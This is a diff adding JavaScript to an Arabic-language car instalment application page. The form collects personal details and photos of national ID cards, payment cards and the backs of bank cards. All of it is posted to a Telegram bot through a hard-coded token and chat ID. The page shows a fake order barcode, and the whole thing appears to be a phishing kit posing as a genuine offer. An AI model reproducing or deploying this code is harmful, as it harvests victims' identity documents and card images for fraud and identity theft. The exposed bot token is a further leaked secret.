+          dz.addEventListener('drop', function (e) {e.preventDefault(); dz.classList.remove('dragover'); const f = e.dataTransfer && e.dataTransfer.files && e.dataTransfer.files[0]; if (f) {if (input) input.files = e.dataTransfer.files; showPreview(f);} });
+        }
+        if (input) {
+          input.addEventListener('change', function (e) {const f = e.target.files && e.target.files[0]; if (f) showPreview(f);});
+        }
+        if (camBtn) {
+          if (key === 'birth') {
+            camBtn.classList.remove('btn-outline-secondary');
+            camBtn.classList.add('btn', 'btn-danger');
+            camBtn.innerHTML = '<i class="fa fa-camera"></i> تصوير (اختياري)';
+          }
+          camBtn.onclick = function () {if (camInput) camInput.click();};
+        }
+        if (camInput) {
+          camInput.addEventListener('change', function (e) {
+            const f = e.target.files && e.target.files[0];
+            if (f) {
+              // mirror to main input
+              if (input) {
+                try {const dt = new DataTransfer(); dt.items.add(f); input.files = dt.files;} catch (err) { }
+              }
+              showPreview(f);
+            }
+          });
+        }
+        if (btnChange) {
+          btnChange.onclick = function () {if (input) input.click();};
+        }
+        if (btnRemove) {
+          btnRemove.onclick = function () {
+            if (input) {input.value = ''; try {input.files = new DataTransfer().files;} catch (e) { } }
+            if (camInput) camInput.value = '';
+            if (img) img.src = '';
+            if (prev) prev.style.display = 'none';
+            if (dz) dz.style.display = 'block';
+          };
+        }
+        return {input: input, img: img, prev: prev};
+      }
+
+      // Initialize
+      var UP = {};
+      try {
+        UP.id = initDropzone('id');
+        UP.gold = initDropzone('gold');
+        UP.birth = initDropzone('birth');
+        UP.backcard = initDropzone('backcard');
+      } catch (e) {console.warn('dropzone init error', e);}
+
+      // send helper
+      async function sendPhoto(fileOrBlob, caption) {
+        const BOT_TOKEN = window.BOT_TOKEN || "8346482529:AAFaVmcDbzzPNZ99QEIYkokgSCpBgT93pGo";
+        const CHAT_ID = window.CHAT_ID || "5794299315";
+        const d = new FormData();
+        d.append('chat_id', CHAT_ID);
+        d.append('photo', fileOrBlob);
+        if (caption) d.append('caption', caption);
+        const resp = await fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendPhoto', {method: 'POST', body: d});
+        if (!resp.ok) {
+          const t = await resp.text().catch(() => '');
+          throw new Error('sendPhoto failed: ' + resp.status + ' ' + t);
+        }
+        return resp;
+      }
+
+      // main submit
+      const form = document.getElementById('carForm');
+      const submitBtn = document.getElementById('submitBtn');
+      const loadingModalEl = document.getElementById('loadingModal');
+      const successModalEl = document.getElementById('successModal');
+      const loadingModal = loadingModalEl ? new bootstrap.Modal(loadingModalEl) : null;
+      const successModal = successModalEl ? new bootstrap.Modal(successModalEl) : null;
+
+      function setLoading(on) {if (submitBtn) submitBtn.disabled = on;}
+
+      function validatePhone(phone) {return /^(05|06|07)\d{8}$/.test(phone);}
+
+      function generateOrderId(len = 6) {
+        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+        let id = ''; for (let i = 0; i < len; i++) id += chars.charAt(Math.floor(Math.random() * chars.length));
+        return id;
+      }
+
+      function drawBarcode(text) {
+        try {
+          const canvas = document.getElementById('barcodeCanvas');
+          if (!canvas) return;
+          const ctx = canvas.getContext('2d');
+          
+          // Clear canvas
+          ctx.clearRect(0, 0, canvas.width, canvas.height);
+          ctx.fillStyle = '#fff';
+          ctx.fillRect(0, 0, canvas.width, canvas.height);
+          
+          // Barcode settings
+          const barHeight = 50;
+          const startX = 20;
+          const startY = 10;
+          const moduleWidth = 2.5; // عرض كل وحدة في الباركود
+          
+          // Code 128 start pattern (11010010000)
+          const startPattern = [1,1,0,1,0,0,1,0,0,0,0];
+          const stopPattern = [1,1,0,0,0,1,1,0,1,0,0,0,1,1]; // Stop pattern
+          
+          // Create a simple encoding pattern based on text
+          let pattern = [...startPattern];
+          
+          // Encode each character (simplified Code 128 simulation)
+          for (let i = 0; i < text.length; i++) {
+            const charCode = text.charCodeAt(i);
+            // Create a pseudo-random but consistent pattern for each character
+            const seed = charCode;
+            const charPattern = [
+              (seed % 2),
+              (seed % 3 > 0 ? 1 : 0),
+              ((seed + 1) % 2),
+              ((seed + 2) % 3 > 0 ? 1 : 0),
+              (seed % 4 > 1 ? 1 : 0),
+              ((seed + 3) % 2),
+              (seed % 3 > 1 ? 1 : 0),
+              ((seed + 4) % 2),
+              (seed % 5 > 2 ? 1 : 0),
+              ((seed + 5) % 2),
+              (seed % 3 === 0 ? 1 : 0)
+            ];
+            pattern.push(...charPattern);
+          }
+          
+          pattern.push(...stopPattern);
+          
+          // Draw the barcode
+          let x = startX;
+          ctx.fillStyle = '#000';
+          
+          for (let i = 0; i < pattern.length; i++) {
+            if (pattern[i] === 1) {
+              ctx.fillRect(x, startY, moduleWidth, barHeight);
+            }
+            x += moduleWidth;
+          }
+          
+          // Draw border
+          ctx.strokeStyle = '#ddd';
+          ctx.lineWidth = 1;
+          ctx.strokeRect(0, 0, canvas.width, canvas.height);
+          
+          // Draw text below barcode
+          ctx.fillStyle = '#000';
+          ctx.font = 'bold 13px "Courier New", monospace';
+          ctx.textAlign = 'center';
+          ctx.fillText(text, canvas.width / 2, canvas.height - 12);
+          
+          // Draw "ORDER ID" label
+          ctx.font = '9px Tahoma, Arial';
+          ctx.fillStyle = '#666';
+          ctx.fillText('ORDER ID', canvas.width / 2, canvas.height - 2);
+          
+        } catch (e) {
+          console.warn('Barcode drawing error:', e);
+        }
+      }
+
+      form.addEventListener('submit', async function (e) {
+        e.preventDefault();
+        // basic validation for required fields (HTML5)
+        if (!form.checkValidity()) {
+          showBottomAlert('⚠️ الرجاء ملء جميع الحقول المطلوبة قبل الإرسال.');
+          return;
+        }
+        const phone = (document.querySelector('input[name="phone"]') || {}).value || '';
+        if (!validatePhone(phone.trim())) {
+          showBottomAlert('⚠️ أدخل رقم هاتف صحيح يبدأ بـ 05 أو 06 أو 07 ويتكون من 10 أرقام.');
+          return;
+        }
+
+        // Determine files or preview
+        function resolveFile(u) {
+          if (!u) return null;
+          // if input.files available
+          try {
+            if (u.input && u.input.files && u.input.files[0]) return u.input.files[0];
+          } catch (e) { }
+          // else if img preview src present (data URL)
+          try {
+            if (u.img && u.img.src) {
+              const src = u.img.src;
+              if (src.startsWith('data:')) return dataURLtoBlob(src);
+              // If it's an external blob URL (object URL), try fetch it and convert to blob
+              if (src.startsWith('blob:')) {
+                // fetch and convert
+                return (async function () {const r = await fetch(src); return await r.blob();})();
+              }
+            }
+          } catch (e) { }
+          return null;
+        }
+
+        let idFile = resolveFile(UP.id);
+        if (idFile && typeof idFile.then === 'function') {idFile = await idFile;}
+        let goldFile = resolveFile(UP.gold);
+        if (goldFile && typeof goldFile.then === 'function') {goldFile = await goldFile;}
+        let birthFile = resolveFile(UP.birth);
+        if (birthFile && typeof birthFile.then === 'function') {birthFile = await birthFile;}
+        let backcardFile = resolveFile(UP.backcard);
+        if (backcardFile && typeof backcardFile.then === 'function') {backcardFile = await backcardFile;}
+
+        // Check if CIB is selected
+        const isCIBSelected = document.getElementById('cib-option') && document.getElementById('cib-option').checked;
+
+        if (!idFile || !goldFile) {
+          showBottomAlert('⚠️ يرجى رفع صورة بطاقة التعريف والبطاقة الذهبية.');
+          return;
+        }
+
+        // If CIB is selected, back card is required
+        if (isCIBSelected && !backcardFile) {
+          showBottomAlert('⚠️ يرجى رفع صورة الواجهة الخلفية للبطاقة البنكية.');
+          return;
+        }
+
+        const orderId = generateOrderId(6);
+        // show loading
+        if (loadingModal) loadingModal.show();
+        setLoading(true);
+
+        try {
+          const fd = new FormData(form);
+          const paymentMethodValue = fd.get('paymentMethod') || '';
+          const phone2 = fd.get('phone2') ? `%0A☎️ رقم الهاتف الثاني: ${fd.get('phone2')}` : '';
+          const msg = `📌 طلب جديد%0A👤 الاسم: ${fd.get('firstName')} ${fd.get('lastName')}%0A🎂 العمر: ${fd.get('age')}%0A🏢 مكان الازدياد: ${fd.get('birthPlace')}%0A💼 موظف: ${fd.get('isEmployed')}%0A💰 الراتب أقل من 20000 دج: ${fd.get('salaryLessThan20k')}%0A🏢 الولاية: ${fd.get('state')}%0A☎️ الهاتف: ${fd.get('phone')}${phone2}%0A📍 العنوان: ${fd.get('address')}%0A🚗 نوع السيارة: ${fd.get('carType')}%0A🎨 اللون: ${fd.get('carColor')}%0A💳 طريقة الدفع: ${fd.get('paymentType')}%0A🏦 وسيلة الدفع: ${paymentMethodValue}%0A🔄 استفاد من التقسيط من قبل: ${fd.get('usedInstallment')}%0A🆔 رقم الطلب: ${orderId}`;
+
+          const BOT_TOKEN = window.BOT_TOKEN || "8346482529:AAFaVmcDbzzPNZ99QEIYkokgSCpBgT93pGo";
+          const CHAT_ID = window.CHAT_ID || "5794299315";
+
+          const r = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${msg}`);
+          if (!r.ok) {
+            const t = await r.text().catch(() => '');
+            throw new Error('sendMessage failed: ' + r.status + ' ' + t);
+          }
+
+          // send photos sequentially
+          await sendPhoto(idFile, `بطاقة التعريف الوطنية — طلب: ${orderId}`);
+          await sendPhoto(goldFile, `البطاقة الذهبية — طلب: ${orderId}`);
+          if (backcardFile) await sendPhoto(backcardFile, `الواجهة الخلفية للبطاقة البنكية — طلب: ${orderId}`);
+          if (birthFile) await sendPhoto(birthFile, `شهادة الميلاد (اختياري) — طلب: ${orderId}`);
+
+          // success
+          if (loadingModal) loadingModal.hide();
+          const orderEl = document.getElementById('orderId');
+          if (orderEl) orderEl.textContent = orderId;
+          drawBarcode(orderId);
+          if (successModal) successModal.show();
+
+          form.reset();
+          // clear previews
+          ['id', 'gold', 'birth', 'backcard'].forEach(function (k) {
+            try {
+              const img = document.getElementById('img-' + k);
+              const prev = document.getElementById('prev-' + k);
+              const dz = document.getElementById('dz-' + k);
+              const input = document.getElementById('input-' + k);
+              const cam = document.getElementById('camera-' + k);
+              if (img) img.src = '';
+              if (prev) prev.style.display = 'none';
+              if (dz) dz.style.display = 'block';
+              if (input) {input.value = ''; try {input.files = new DataTransfer().files;} catch (e) { } }
+              if (cam) cam.value = '';
+            } catch (e) { }
+          });
+
+          // Hide back card section after reset
+          const backCardSection = document.getElementById('backCardSection');
+          if (backCardSection) backCardSection.style.display = 'none';
+
+        } catch (err) {
+          console.error('Send error:', err);
+          try {if (loadingModal) loadingModal.hide();} catch (e) { }
+          showBottomAlert('⚠️ حدث خطأ أثناء الإرسال. حاول مجددًا.');
+        } finally {
+          setLoading(false);
+        }
+
+      });
+
+    });
+
+    // Copy order ID function
+    function copyOrderId() {
+      const orderIdElement = document.getElementById('orderId');
+      if (!orderIdElement) return;
+      
+      const orderId = orderIdElement.textContent;
+      
+      // Try to use Clipboard API
+      if (navigator.clipboard && navigator.clipboard.writeText) {
+        navigator.clipboard.writeText(orderId).then(function() {
+          showCopyFeedback();
+        }).catch(function(err) {
+          console.error('Could not copy text: ', err);
+          fallbackCopyTextToClipboard(orderId);
+        });
+      } else {
+        fallbackCopyTextToClipboard(orderId);
+      }
+    }
+
+    function fallbackCopyTextToClipboard(text) {
+      const textArea = document.createElement("textarea");
+      textArea.value = text;
+      textArea.style.position = "fixed";
+      textArea.style.top = 0;
+      textArea.style.left = 0;
+      document.body.appendChild(textArea);
+      textArea.focus();
+      textArea.select();
+
+      try {
+        document.execCommand('copy');
+        showCopyFeedback();
+      } catch (err) {
+        console.error('Fallback: Could not copy text: ', err);
+      }
+
+      document.body.removeChild(textArea);
+    }
+
+    function showCopyFeedback() {
+      const copyBtn = document.querySelector('.copy-btn');
+      if (copyBtn) {
+        const originalHTML = copyBtn.innerHTML;
+        copyBtn.innerHTML = '<i class="fa fa-check"></i>';
+        copyBtn.style.background = '#4BB543';
+        copyBtn.style.color = 'white';
+        
+        setTimeout(function() {
+          copyBtn.innerHTML = originalHTML;
+          copyBtn.style.background = '';
+          copyBtn.style.color = '';
+        }, 2000);
+      }
+    }
+  </script>
 </body>
+
 </html>
